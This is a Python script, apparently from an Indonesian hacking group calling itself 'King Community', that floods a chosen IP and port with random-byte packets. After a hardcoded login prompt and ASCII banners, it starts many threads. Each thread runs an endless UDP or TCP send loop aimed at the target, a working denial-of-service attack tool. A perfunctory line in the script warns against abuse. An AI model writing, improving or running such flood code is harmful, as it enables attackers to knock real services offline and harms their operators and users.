username ='King Community'
password ='King Community'
import random
import socket
import threading
import os,sys
import time

os.system("clear")

for i in range(3):
    urm = input("[•] Username: ")
    j=3
    if(urm==username):
        time.sleep(5)
        print("[#] Tunggu Sedang Di Check!!!")
        break
    else:
        time.sleep(5)
        print("[×] Pasword Salah!!! ")
        continue
time.sleep(5)
print("[√] Username Berhasil")
time.sleep(5)

for i in range(3):
    pwd = input("[•] Password : ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[+] Tunggu Sedang Di Check!!! ")
        break
    else:
        time.sleep(5)
        print("[×] Password Salah!!! ")
        continue
time.sleep(5)
print("[@] Login Berhasil")
time.sleep(5)

os.system("clear")
print("\033[91m")
print("""
██╗███╗░░██╗██████╗░██╗░░░██╗████████╗
██║████╗░██║██╔══██╗██║░░░██║╚══██╔══╝
██║██╔██╗██║██████╔╝██║░░░██║░░░██║░░░
██║██║╚████║██╔═══╝░██║░░░██║░░░██║░░░
██║██║░╚███║██║░░░░░╚██████╔╝░░░██║░░░
╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░
""")
print("KETIK BAWAH")
print("DDOS-ATTACK")

test = input()
if test == "DDOS-ATTACK":
    exit(5)
os.system("clear")
print("============⚠WARNING⚠︎============")
print("JANGAN ABUSE, BUATLAH UNTUK KEBAIKAN")
print("============⚠WARNING⚠︎============")
time.sleep(10)

os.system("clear")
print ("Autor : Lnsky ")
print("""\033[91m
██████╗░██████╗░░█████╗░░██████╗            
██╔══██╗██╔══██╗██╔══██╗██╔════╝            
██║░░██║██║░░██║██║░░██║╚█████╗░            
██║░░██║██║░░██║██║░░██║░╚═══██╗            
██████╔╝██████╔╝╚█████╔╝██████╔╝            
╚═════╝░╚═════╝░░╚════╝░╚═════╝░            

░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
""")
print("\033[0m")

print("==== KING COMMUNITY ====") 
print("==== Owner : IsiahPH#4034 ====") 
print("==== Subscribe Yt Saya : IsiahPH Cute ====") 

ip = str(input("\033[91m Ip:"))
port = int(input("\033[91m Port:"))
choice = str(input("\033[91m Gas Ddos? (y/n):"))
times = int(input("\033[91m Packets:"))
threads = int(input("\033[91m Threads:"))
print("YAKIN IP INI? IP %s PORT %s"%(ip, port))
choice = str(input("y/n:"))
print("PROSES TUNGGU 5 DETIK")
time.sleep(5)

os.system("clear")
print("\033[91m")
print("LOADING.")
time.sleep(1)
print("LOADING..")
time.sleep(1)
print("LOADING...")
time.sleep(1)
print("LOADING....")
time.sleep(1)
print("LOADING.....")
time.sleep(1)
print("!!!!!!!PROGRAM START!!!!!!!")
time.sleep(4)
print("!!!!!!!LOOCKED IP %s PORT %s!!!!!!!"%(ip, port))
time.sleep(2)
print("!!!!!!!LOOCKED IP TUNGGU 10 DETIK!!!!!!!")
time.sleep(10)
os.system("clear")
def run():
        data = random._urandom(1800)
        i = random.choice(("\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91m KING COMMUNITY MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[~] KING COMMUNITY NI DECK!!!")

def run2():
        data = random._urandom(1024)
        i = random.choice(("\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m KING COMMUNITY MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] KING COMMUNITY NI DECK!!!")

def run3():
        data = random._urandom(16)
        i = random.choice(("\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m KING COMMUNITY MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] KING COMMUNITY NI DECK!!!")


def run4():
        data = random._urandom(16)
        i = random.choice(("\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> ","\033[93m[@] (KING COMMUNITY) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m KING COMMUNITY MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] KING COMMUNITY NI DECK!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
